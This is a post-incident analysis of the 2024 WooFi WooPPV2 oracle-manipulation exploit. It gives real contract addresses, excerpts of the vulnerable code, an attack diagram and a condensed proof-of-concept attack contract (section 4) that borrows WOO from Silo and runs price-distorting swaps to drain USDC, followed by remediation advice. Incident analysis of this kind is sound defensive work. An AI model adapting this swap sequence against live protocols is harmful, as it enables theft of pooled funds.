# WooFi — WooPPV2 Sequential Swap Oracle Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-03 |
| **Protocol** | WooFi (WooPPV2) |
| **Chain** | Arbitrum |
| **Loss** | ~$8,000,000 |
| **Vulnerable Contract** | [WooPPV2 0xeFF23B4b](https://arbiscan.io/address/0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062) |
| **Silo** | [0x5C2B8021](https://arbiscan.io/address/0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F) |
| **WooracleV2** | [0x73504eaC](https://arbiscan.io/address/0x73504eaCB100c7576146618DC306c97454CB3620) |
| **UniV3 Pool** | [0xC31E54c7](https://arbiscan.io/address/0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443) |
| **Root Cause** | WooPPV2's `swap()` function allows sequential large swaps to distort WooracleV2's internal price; WOO tokens borrowed from Silo are used to drain USDC at the manipulated price |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/Woofi_exp.sol) |

---

## 1. Vulnerability Overview

WooFi's WooPPV2 uses its own WooracleV2 oracle to determine swap prices. This oracle can be manipulated via sequential large swaps within the same transaction. The attacker flash-loaned ~10B USDC.e from Uniswap V3, additionally borrowed WOO from Silo, then distorted WooracleV2 prices through a USDC→WETH→WOO→USDC swap sequence to drain ~$8M.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: WooracleV2 can be manipulated by swaps within the same TX
interface IWooPPV2 {
    function swap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minToAmount,
        address to,
        address rebateTo
    ) external returns (uint256 realToAmount);
}

// WooracleV2: updates internal state based on the last swap price
// Large USDC → WETH swap → WETH price increases
// Large USDC → WOO swap → WOO price increases
// Large WOO → USDC swap → USDC received at manipulated inflated price

// ✅ Safe code: validate price against external Chainlink TWAP
function _checkPrice(address token, uint256 woPrice) internal view {
    uint256 clPrice = IChainlink(feeds[token]).latestAnswer();
    uint256 deviation = abs(woPrice - clPrice) * 10000 / clPrice;
    require(deviation <= MAX_PRICE_DEVIATION, "price deviation too high");
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: WooPPV2.sol
    function swap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minToAmount,
        address to,
        address rebateTo
    ) external override returns (uint256 realToAmount) {
        if (fromToken == quoteToken) {
            // case 1: quoteToken --> baseToken
            realToAmount = _sellQuote(toToken, fromAmount, minToAmount, to, rebateTo);
        } else if (toToken == quoteToken) {
            // case 2: fromToken --> quoteToken
            realToAmount = _sellBase(fromToken, fromAmount, minToAmount, to, rebateTo);
        } else {
            // case 3: fromToken --> toToken (base to base)
            realToAmount = _swapBaseToBase(fromToken, toToken, fromAmount, minToAmount, to, rebateTo);  // ❌ vulnerability
        }
    }
```

```solidity
// File: IWooracleV2.sol
    function price(address base) external view returns (uint256 priceNow, bool feasible);  // ❌ vulnerability

    /// @notice Updates the Wooracle price for the specified base token
    function postPrice(address base, uint128 newPrice) external;

    /// @notice State of the specified base token.
    function state(address base) external view returns (State memory);

    /// @notice The price decimal for the specified base token (e.g. 8)
    function decimals(address base) external view returns (uint8);

    /// @notice The quote token for calculating WooPP query price
    function quoteToken() external view returns (address);

    /// @notice last updated timestamp
    function timestamp() external view returns (uint256);

    /// @notice Flag for Wooracle price feasible
    function isWoFeasible(address base) external view returns (bool);
}
```

```solidity
// File: IWooPPV2.sol
    function swap(  // ❌ vulnerability
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minToAmount,
        address to,
        address rebateTo
    ) external returns (uint256 realToAmount);

    /// @notice Deposit the specified token into the liquidity pool of WooPPV2.
    /// @param token the token to deposit
    /// @param amount the deposit amount
    function deposit(address token, uint256 amount) external;
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Uniswap V3 flash: ~10B USDC.e flash loan
  │
  ├─→ [2] LBT flash: additional WOO token borrow
  │
  ├─→ [3] Silo.deposit(USDC) → Silo.borrow(WOO)
  │
  ├─→ [4] WooPPV2.swap(USDC → WETH, 2B) — WETH price increases
  │
  ├─→ [5] WooPPV2.swap(USDC → WOO, 100M) — WOO price increases
  │
  ├─→ [6] WooPPV2.swap(WOO → USDC, massive) — USDC received at manipulated price
  │
  ├─→ [7] WooPPV2.swap(USDC → WOO) — additional arbitrage
  │
  ├─→ [8] Silo repayment + flash loan repayment
  │
  └─→ [9] ~$8M profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IWooPPV2 {
    function swap(address fromToken, address toToken, uint256 fromAmount, uint256 minToAmount, address to, address rebateTo) external returns (uint256);
}

interface ISilo {
    function deposit(address asset, uint256 amount, bool collateralOnly) external returns (uint256);
    function borrow(address asset, uint256 amount) external returns (uint256);
    function repay(address asset, uint256 amount) external returns (uint256);
    function withdraw(address asset, uint256 amount, bool collateralOnly) external returns (uint256);
}

contract AttackContract {
    IWooPPV2 constant woo   = IWooPPV2(0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062);
    ISilo    constant silo  = ISilo(0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F);

    function executeOperation(...) external returns (bool) {
        // [1] Silo: deposit USDC as collateral, then borrow WOO
        silo.deposit(USDC, usdcAmount, false);
        silo.borrow(WOO, availableWOO);

        // [2] Price manipulation swap sequence
        woo.swap(USDC, WETH, 2_000_000_000e6, 0, address(this), address(0));  // WETH price increases
        woo.swap(USDC, WOO,  100_000_000e6,   0, address(this), address(0));  // WOO price increases

        // [3] Receive large amount of USDC at manipulated WOO price
        uint256 wooBalance = IERC20(WOO).balanceOf(address(this));
        woo.swap(WOO, USDC, wooBalance, 0, address(this), address(0));

        // [4] Additional USDC → WOO swap for arbitrage profit
        woo.swap(USDC, WOO, remainingUSDC, 0, address(this), address(0));

        // [5] Repay Silo
        silo.repay(WOO, borrowedWOO);
        silo.withdraw(USDC, usdcAmount, false);

        return true;
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Internal Oracle Manipulation |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **Attack Vector** | External (Flash loan + sequential swap oracle manipulation) |
| **DApp Category** | DEX with proprietary oracle |
| **Impact** | $8M drained via oracle price distortion |

## 6. Remediation Recommendations

1. **Cross-validate with external oracle**: Revert if deviation from external price sources such as Chainlink exceeds 5%
2. **Single-TX swap volume cap**: Block swaps above a certain amount per transaction, or impose significantly higher fees
3. **Sequential swap price impact limit**: Revert if consecutive swaps move the price by more than N%
4. **Apply TWAP to WooracleV2**: Use time-weighted average price instead of spot price

## 7. Lessons Learned

- DEXes using a proprietary oracle can have that oracle's price manipulated via large single-transaction swaps.
- Without cross-validation against external price sources such as Chainlink, an internal oracle becomes an attack vector.
- A flash loan of ~10B USDC.e is large enough to overwhelm virtually any internal oracle, and protocols must account for this scale.